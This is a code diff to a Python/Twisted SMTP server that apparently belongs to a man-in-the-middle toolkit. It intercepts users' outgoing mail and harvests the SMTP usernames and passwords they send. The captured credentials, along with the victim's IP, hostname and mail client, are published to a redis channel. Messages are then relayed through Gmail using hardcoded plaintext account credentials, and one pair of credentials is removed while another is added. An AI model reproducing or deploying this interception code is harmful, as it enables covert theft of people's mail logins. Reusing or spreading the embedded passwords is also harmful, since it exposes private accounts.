@@ -3,6 +3,9 @@ import binascii
 import redis
 import json
 import time
+import os
+import inspect
+import socket
 
 from OpenSSL import SSL
 
@@ -18,6 +21,7 @@ try:
 except ImportError:
 	from StringIO import StringIO
 
+scriptFolder = os.path.dirname(os.path.abspath(inspect.getfile(inspect.currentframe())))
 
 
 smtpRedisClient = None
@@ -30,8 +34,14 @@ class JJMessage(object):
 		self.protocol = protocol
 		self.recipient = str(recipient)
 		self.lines = []
+		self.mailClient = ''
 
 	def lineReceived(self, line):
+		if line.find('X-Mailer:') >= 0:
+			split = line.split('X-Mailer:')
+			if len(split) == 2:
+				self.mailClient = split[1]
+
 		self.lines.append(line)
 
 	def eomReceived(self):
@@ -45,32 +55,44 @@ class JJMessage(object):
 		d['to'] = str(self.protocol.origin)
 		d['message'] = messageData
 		d['time'] = int(time.time())
+		d['ip'] = self.protocol.remoteHostIp
+		d['hostname'] = self.protocol.remoteHostname
+		d['mailclient'] = self.mailClient
 		try:
 			smtpRedisClient.publish('new:mail', json.dumps(d))
 		except:
 			print "Publishing failed"
 			pass
 
-		# Really send mail here
 		print 'REALLY SENDING THE MAIL'
 
-		# this is just a test because of ipfw forwarding all traffic to my own machine -> infinite loop yo!
-
-		self.protocol.username = 'wp10619035-johnny'
-		self.protocol.password = 'aRvIpXalEYxLYwTY' 
-
 		msg = StringIO(messageData)
-		try:
-			dfd = sendmail(self.protocol.username, self.protocol.password, self.protocol.origin, self.recipient, msg, self.protocol.destHost, self.protocol.destPort)
-			dfd.addCallback(lambda result: lp("Real mail sent"))
-		except:
-			print "Mail sending failed"
-			pass
+		self.msgIO = msg
+		self.realMailTransfer()
+		
 		return defer.succeed(None)
 		
 
 	def connectionLost(self):
 		print "Connection lost unexpectedly"
+
+	def realMailTransfer(self, portIndex = -1):
+		portIndex += 1
+
+		host = 'smtp.gmail.com'
+		portsToTry = [25, 465, 587] # try all SMTP ports
+		uname = 'wearethejj@gmail.com'
+		pword = 'muschi123'
+
+		if portIndex < len(portsToTry):
+			print "Trying port " + str(portsToTry[portIndex])
+			dfd = sendmail(uname, pword, self.protocol.origin, self.recipient, self.msgIO, host, portsToTry[portIndex])
+			dfd.addCallbacks((lambda result: lp("Mail successfully sent")), (lambda result: self.realMailTransfer(portIndex)))
+		else:
+			print 'All ports unsuccessfully tried. Mail cannot be sent'
+		
+		return None
+
 
 class JJMessageDelivery(object):
 	implements(smtp.IMessageDelivery)
@@ -151,13 +173,24 @@ class JJESMTP(smtp.ESMTP):
 			print 'Publishing mail account credentials to redis'
 			c = {}
 			c['date'] = int(time.time())
-			c['username'] = self.username
-			c['password'] = self.password
+			c['username'] 	= self.username
+			c['password'] 	= self.password
+			c['ip'] 		= self.remoteHostIp
+			c['hostname']	= self.remoteHostname
 			try:
 				smtpRedisClient.publish("new:mail_credentials", json.dumps(c))
 			except:
 				print "Publishing failed"
 				pass
+
+	def do_EHLO(self, rest):
+		smtp.ESMTP.do_EHLO(self, rest)
+		self.remoteHostIp = self._helo[1]
+		self.remoteHostname = ''
+		try:
+			self.remoteHostname = socket.gethostbyaddr(self.remoteHostIp)[0]
+		except:
+			pass
 
 
 # For our SSL shizzl
@@ -188,7 +221,7 @@ class JJSMTPFactory(smtp.SMTPFactory):
 		proto.challengers = {"LOGIN": LOGINCredentials}
 
 		# SSL
-		proto.ctx = ServerTLSContext(privateKeyFileName='/usr/share/subterfuge/jjmail/certs/server.key', certificateFileName='/usr/share/subterfuge/jjmail/certs/server.crt')
+		proto.ctx = ServerTLSContext(privateKeyFileName=scriptFolder + '/certs/server.key', certificateFileName=scriptFolder + '/certs/server.crt')
 
 		return proto
 
@@ -236,6 +269,7 @@ def sendmail(
         toAddress,
         messageFile,
         resultDeferred,
+        0,
         contextFactory=contextFactory)
 
     reactor.connectTCP(smtpHost, smtpPort, senderFactory)
